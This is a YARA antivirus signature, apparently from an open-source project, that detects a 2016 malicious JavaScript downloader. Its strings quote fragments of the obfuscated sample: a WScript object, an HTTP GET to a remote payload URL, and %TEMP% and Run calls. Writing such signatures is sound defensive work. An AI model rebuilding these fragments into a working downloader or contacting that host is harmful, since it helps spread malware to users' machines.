rule sig_20160428_c23b63bae21a4c1e8daa63187fed7283 {
  meta:
    description = "datamaliciousorder - file 20160428_c23b63bae21a4c1e8daa63187fed7283.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c2f86f132247cd9e5446ed79daf28dbebf34ace19841872a01a6e61f205fd8bb"

  strings:
    $s1  = "WfzZbrFufXovGmcVawFcf[JuvOcoThyOeeTjaRdwWog](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function JxsSzpXeyFwjGtqRetJqt(XrcNieXsfUbiYjvHnzAac){KeeVslCfiKisNtvSzkZam[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function JxsSzpXeyFwjGtqRetJqt(XrcNieXsfUbiYjvHnzAac){KeeVslCfiKisNtvSzkZam[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function SipHqgZmeZddOrjPadMdw() {return KeeVslCfiKisNtvSzkZam[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return QbzXyqEtgYboLzyHxnHhc - DwzCtgVdsAxpKvwNxiWvt;};" fullword ascii
    $s6  = "function DjdSasMcdYlgVipGvlIqi(QbzXyqEtgYboLzyHxnHhc, DwzCtgVdsAxpKvwNxiWvt){UllKkwLgaLcmLeaXlwTpe = UllKkwLgaLcmLeaXlwTpe * 1; " ascii
    $s7  = "var YekHozWdyYvvKkeMfzWfj = this[\"WScript\"];" fullword ascii
    $s8  = "function SipHqgZmeZddOrjPadMdw() {return KeeVslCfiKisNtvSzkZam[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function DjdSasMcdYlgVipGvlIqi(QbzXyqEtgYboLzyHxnHhc, DwzCtgVdsAxpKvwNxiWvt){UllKkwLgaLcmLeaXlwTpe = UllKkwLgaLcmLeaXlwTpe * 1; " ascii
    $s10 = "var KeeVslCfiKisNtvSzkZam = function MrpIpsWssWorGfvPrcAvz() {return YekHozWdyYvvKkeMfzWfj[IwvDhbOtxSulHovRxsTbm](\"WScript\"+\"" ascii
    $s11 = "if (WfzZbrFufXovGmcVawFcf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function CzjDclBbdLohVheVwaOtd() {return ((DtzYjtRsuPttLztVlrYkb == true) && (DtzYjtRsuPttLztVlrYkb == SuiKptVxbMwkRgrFsqGzs)) ?" ascii
    $s13 = "function CzjDclBbdLohVheVwaOtd() {return ((DtzYjtRsuPttLztVlrYkb == true) && (DtzYjtRsuPttLztVlrYkb == SuiKptVxbMwkRgrFsqGzs)) ?" ascii
    $s14 = "var KeeVslCfiKisNtvSzkZam = function MrpIpsWssWorGfvPrcAvz() {return YekHozWdyYvvKkeMfzWfj[IwvDhbOtxSulHovRxsTbm](\"WScript\"+\"" ascii
    $s15 = "var SuiKptVxbMwkRgrFsqGzs = false;" fullword ascii
    $s16 = "}while (JvtOplPzvBmyGygAobMot);" fullword ascii
    $s17 = "return DjdSasMcdYlgVipGvlIqi(1 == 1 ? FugIynBiqWjeDacMgzQsy : 0, 1 == 1 ? WeaNckJjbYspPazBwdGjt : 0);" fullword ascii
    $s18 = "var DtzYjtRsuPttLztVlrYkb = false;" fullword ascii
    $s19 = "SuiKptVxbMwkRgrFsqGzs = true; " fullword ascii
    $s20 = "var ZmzLhzCggFvcGrfHkqBnw = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}